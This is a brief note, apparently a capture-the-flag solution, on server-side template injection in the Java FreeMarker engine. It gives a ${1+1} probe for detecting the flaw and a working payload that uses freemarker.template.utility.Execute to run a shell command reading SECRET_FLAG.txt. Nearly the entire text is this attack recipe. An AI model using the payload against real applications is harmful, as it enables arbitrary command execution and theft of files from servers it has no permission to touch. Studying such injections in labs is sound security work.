Templating system is based on Freemaker (java templating)
we can test if it's insecure by trying to inject ${1+1} and if we see 2 it's done
code to inject to get the flag
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat SECRET_FLAG.txt") }
